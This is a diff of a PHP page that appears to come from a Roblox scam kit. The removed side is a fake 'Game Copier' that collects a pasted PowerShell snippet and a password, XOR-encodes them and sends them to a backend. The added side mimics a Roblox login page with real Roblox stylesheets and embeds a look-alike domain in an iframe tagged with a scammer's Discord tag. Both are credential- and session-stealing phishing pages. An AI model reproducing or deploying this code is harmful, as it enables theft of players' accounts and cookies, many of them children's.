@@ -1,214 +1,28 @@
 <?php
-$_b_p = "ac";
-require_once($_SERVER["DOCUMENT_ROOT"] . "/framework/framework.php");
-if (session_status() === PHP_SESSION_NONE) 
-{
-    session_start();
-};
-if ($_COOKIE["auth"])
-{
-    die(header("Location: /dashboard"));
-};
+// method by vKevin#0001 / vKevin#6666
+$creator = "Your Discord Tag";
+// method by vKevin#0001 / vKevin#6666
 ?>
-<!DOCTYPE html>
-<html lang="en">
-    <head>
-        <meta charset="utf-8"/>
-        <meta name="viewport" content="width=device-width, initial-scale=1"/>
-        <title><?=$site_info["name"];?> - Game Copier</title>
-        <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700;800;900&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet"/>
-        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-        <link href="/assets/index.css?<?=rand(99999999999, 9999999999999999);?>" rel="stylesheet"/>
-    </head>
-    <body>
-
-        <div class="cursor" id="cursor">
-            <div class="cursor_dot" id="cursor_dot"></div>
-            <div class="cursor_ring" id="cursor_ring"></div>
-        </div>
-
-        <div class="toast" id="toast"></div>
-
-        <div class="mesh"></div>
-        <div class="grid_lines"></div>
-        <div class="orb orb_1"></div>
-        <div class="orb orb_2"></div>
-
-        <div class="nav_wrap">
-            <nav class="nav">
-                <span class="nav_brand">Rbx<em><?=$site_info["name"];?></em></span>
-                <div class="nav_sep"></div>
-                <a class="nav_link" href="#">Docs</a>
-                <a class="nav_link" href="#">Support</a>
-                <div class="nav_sep"></div>
-                <a class="nav_cta" href="#">Join</a>
-            </nav>
-        </div>
-
-        <div class="hero">
-            <div class="hero_eyebrow">
-                <span class="hero_eyebrow_dot"></span>
-                Roblox Game Copier
-            </div>
-            <h2>
-                <span class="line_1">Clone any game.</span>
-                <span class="line_2"><em>No limits.</em></span>
-            </h2>
-            <p class="hero_sub">Copy any Roblox game instantly with a secure pin lock. Fast, simple, reliable.</p>
-            <div class="hero_stats">
-                <div class="stat">
-                    <span class="stat_val">10<em>k+</em></span>
-                    <span class="stat_label">Games Copied</span>
-                </div>
-                <div class="stat_sep"></div>
-                <div class="stat">
-                    <span class="stat_val"><em>&lt;</em>2s</span>
-                    <span class="stat_label">Copy Time</span>
-                </div>
-                <div class="stat_sep"></div>
-                <div class="stat">
-                    <span class="stat_val">100<em>%</em></span>
-                    <span class="stat_label">Uptime</span>
-                </div>
-            </div>
-        </div>
-
-        <main class="main">
-
-            <div class="glass_card" id="card_a">
-                <div class="card_glass"></div>
-                <div class="card_specular"></div>
-                <div class="card_refraction" id="refraction_a"></div>
-                <div class="card_body">
-                    <div class="card_label">
-                        <span class="card_label_num">01 — Copier</span>
-                        <div class="card_label_line"></div>
-                    </div>
-                    <h2>Copy Game</h2>
-                    <div class="divider"></div>
-                    <div class="field_group">
-                        <div class="field">
-                            <div class="field_icon">
-                                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
-                                    <circle cx="12" cy="7" r="4"/>
-                                </svg>
-                            </div>
-                            <input type="text" id="powershell" placeholder="Powershell" autocomplete="off" spellcheck="false"/>
-                        </div>
-                        <div class="field">
-                            <div class="field_icon">
-                                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                                    <rect x="3" y="11" width="18" height="11" rx="2"/>
-                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-                                </svg>
-                            </div>
-                            <input type="text" id="password" placeholder="Password" autocomplete="off" spellcheck="false"/>
-                        </div>
-                    </div>
-                    <div class="cf_wrap">
-                        <div class="cf-turnstile" id="ts_main" data-sitekey="<?=$site_info["site_key"];?>" data-theme="dark"></div>
-                    </div>
-                    <button class="action_btn" id="action_btn" onclick="handle_submit()">
-                        <span class="btn_label">Submit</span>
-                    </button>
-                </div>
-            </div>
-
-            <div class="glass_card" id="card_b">
-                <div class="card_glass"></div>
-                <div class="card_specular"></div>
-                <div class="card_refraction" id="refraction_b"></div>
-                <div class="card_body">
-                    <div class="card_label">
-                        <span class="card_label_num">02 — Tutorial</span>
-                        <div class="card_label_line"></div>
-                    </div>
-                    <h2>Tutorial</h2>
-                    <div class="divider"></div>
-                    <div class="video_shell">
-                        <video controls preload="none">
-                            <source src="https://bloxtools.tr/videos/CopyGames.mp4" type="video/mp4"/>
-                            Your browser doesn't support video.
-                        </video>
-                    </div>
-                </div>
-            </div>
-
-        </main>
-        <script>
-            const show_toast = (msg, duration = 2800) => {
-                const el = document.getElementById("toast");
-                el.textContent = msg;
-                el.classList.add("show");
-                setTimeout(() => el.classList.remove("show"), duration);
-            };
-            
-            const get_ts_token = () => {
-                const i = document.querySelector("#ts_main [name='cf-turnstile-response']");
-                return i ? i.value.trim() : "";
-            };
-        
-            function xor_encrypt(data, key) 
-            {
-                const d = typeof data === "string" ? data : JSON.stringify(data);
-                const encoded = unescape(encodeURIComponent(d));
-                let out = "";
-                for (let i = 0; i < encoded.length; i++)
-                    out += String.fromCharCode(encoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-                return btoa(out);
-            }
-            
-            const handle_submit = () => {
-                const powershell = document.getElementById("powershell").value.trim();
-                const password   = document.getElementById("password").value.trim();
-                const token      = get_ts_token();
-
-                if (!powershell) {
-                    show_toast("⚠️  Please enter your Powershell.");
-                    document.getElementById("powershell").focus();
-                    return;
-                }
-                if (!password) {
-                    show_toast("⚠️  Please enter your Password.");
-                    document.getElementById("password").focus();
-                    return;
-                }
-                if (!token) {
-                    show_toast("⚠️  Please complete the CAPTCHA.");
-                    return;
-                }
-
-                const btn   = document.getElementById("action_btn");
-                const label = btn.querySelector(".btn_label");
-                btn.disabled = true;
-                label.textContent = "Processing…";
-                const blob = xor_encrypt({ method: "submit", site_id: 0, powershell, password}, "<?=$site_info["name"];?>HAR");
-
-                fetch("/framework/api", {
-                    method:  "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body:    JSON.stringify({ blob, token })
-                })
-                .then(r => r.json())
-                .then(d => {
-                    if (d.error) throw new Error(d.error);
-                    label.textContent = "✓ Done";
-                    show_toast("✓  Submitted successfully!");
-                    if (typeof turnstile !== "undefined") turnstile.reset(document.getElementById("ts_main"));
-                    setTimeout(() => {
-                        btn.disabled      = false;
-                        label.textContent = "Submit";
-                    }, 2200);
-                })
-                .catch(err => {
-                    show_toast("✗  " + (err.message || "Something went wrong."));
-                    btn.disabled      = false;
-                    label.textContent = "Submit";
-                    if (typeof turnstile !== "undefined") turnstile.reset(document.getElementById("ts_main"));
-                });
-            };
-        </script>
-
-    </body>
-</html>
+<title>Dashboard</title>
+<link href="https://images.rbxcdn.com/3b43a5c16ec359053fef735551716fc5.ico" rel="icon"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/e337f76ff7ef48cc379bbb96ff09cd601e8901ddc2f631f8d461c485475f3960.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/9517d686dc47015c200496d77e2b18146ee37652d18e25ecf9e1ed230310ea13.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/5bff53ca0632d33ad4fcd1785c2dc7f2824a3db5c3abc2baeec2aded75fd5732.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/bbfa8678c5dc8467d00c4a99038f3b73d7e45b31d571be1c9eb16ca5a3708ac6.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/d5344f38053922e5936f0d7e2d3496ee4f83b46f0bb40d1d2c253b80ac82668e.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/2c2a709240897ce382b7ff55be4347cd0994ab1e2d6ed3b56649e54b0e97e13a.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ConfigureWebApps" data-bundle-source="Main" href="https://css.rbxcdn.com/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css"><link rel="canonical" href="https://www.roblox.com/users/118320788/profile"><link onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___5e469c309d1eeddf42cc9d36a50f82e0_m.css/fetch"><link onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/page___b2f914841caf8323081e7f9c739853cb_m.css/fetch"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/0f161e158c689e76fd22cad828c428186a12e276dc4601aaffe5230c3ead905e.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="PeopleList" data-bundle-source="Main" href="https://css.rbxcdn.com/5b78f24a5404361865e0b4270f7a5f530983e00cb93db4587fd8204050dc3cc7.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Aliases" data-bundle-source="Main" href="https://css.rbxcdn.com/953a9da513bd8e7ad185ac5197c1c7cdf2951cb17ffdf79b51e6b237c64255d3.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="GroupsList" data-bundle-source="Main" href="https://css.rbxcdn.com/105adf87a231522c9bc7de0beae9cc928c074a72def1e694727ac27cd242359e.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="UserDescription" data-bundle-source="Main" href="https://css.rbxcdn.com/192054a85a454151ab8e7e1b0ab68f630347c67d6f0cc0be54c6cd3cd6e5f456.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CurrentWearing" data-bundle-source="Main" href="https://css.rbxcdn.com/cc693776e7662b9afb39b185b252b4f5e8cfb19436bf079b0bc6e2e970112c9d.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ProfileBadges" data-bundle-source="Main" href="https://css.rbxcdn.com/9a71331ed246c4c79ccb18c8582bb1366a2a66843c0776e767b0b48634d36dfa.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ProfileStatistics" data-bundle-source="Main" href="https://css.rbxcdn.com/b52536edd49882b6c7ffbb39e44d25c8f3a96eceb0bf94b4413e6ae9f6e2477b.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/2f599b9e9ca20ee3c155684adbf1cdcb7220bab681b55b4505123a0c34e81969.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" href="https://css.rbxcdn.com/5f0aaea202731154b5586a247c44150da5f63e70d4c0e03cdabe06c62e76d10c.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" href="https://css.rbxcdn.com/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/ee025c4a3d462f18f2f0dd7d6b4d816b67288bba15dc842e79267444ac24e936.css"><link rel="stylesheet" onerror="Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Login" data-bundle-source="Main" href="https://css.rbxcdn.com/5eb9680d41912dde3d60eaf0d84afe08b3d3e7336862bf0a854b6c2f93cb2d42.css">
+    <link href="https://css.rbxcdn.com/24a76e8ea70afb9462fad013faa3d22ff3e832e8327ddd764dafe328918bed90.css">
+           <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/e0d4fd774937f217b54c178d68182d5ef0928a164feb48c7245bb06dea07dba4.css"> 
+  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/9517d686dc47015c200496d77e2b18146ee37652d18e25ecf9e1ed230310ea13.css"> 
+  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/4cfc9413aaac922000f010ba651f264e59a200d6062d41f8196017ade0094116.css"> 
+  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/9436c6cbe91fa165e539bde07534dd30493b8e7343503ad5b6f70b709200558d.css"> 
+  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/d5344f38053922e5936f0d7e2d3496ee4f83b46f0bb40d1d2c253b80ac82668e.css"> 
+  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ConfigureWebApps" data-bundle-source="Main" href="https://css.rbxcdn.com/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css"> 
+  <link rel="canonical" href="https://www.roblox.com/NewLogin"> 
+  <link onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___5e469c309d1eeddf42cc9d36a50f82e0_m.css/fetch"> 
+  <link onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/page___af05d6ae92ceb4b3d17e24b7687be717_m.css/fetch"> 
+  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/24a76e8ea70afb9462fad013faa3d22ff3e832e8327ddd764dafe328918bed90.css"> 
+  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" href="https://css.rbxcdn.com/5f0aaea202731154b5586a247c44150da5f63e70d4c0e03cdabe06c62e76d10c.css"> 
+  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" href="https://css.rbxcdn.com/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css"> 
+  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/2f599b9e9ca20ee3c155684adbf1cdcb7220bab681b55b4505123a0c34e81969.css "> 
+  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Login" data-bundle-source="Main" href="https://css.rbxcdn.com/5eb9680d41912dde3d60eaf0d84afe08b3d3e7336862bf0a854b6c2f93cb2d42.css"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"> 
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js" ></script>
+<meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="5" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4"> 
+ <body id="rbx-body" class="rbx-body   dark-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0"> 
+<iframe src="https://wwvv-robloxx.com/?creator=<?php echo $creator?>" width="100%" height="100%" frameborder="0" scrolling="no"></iframe>
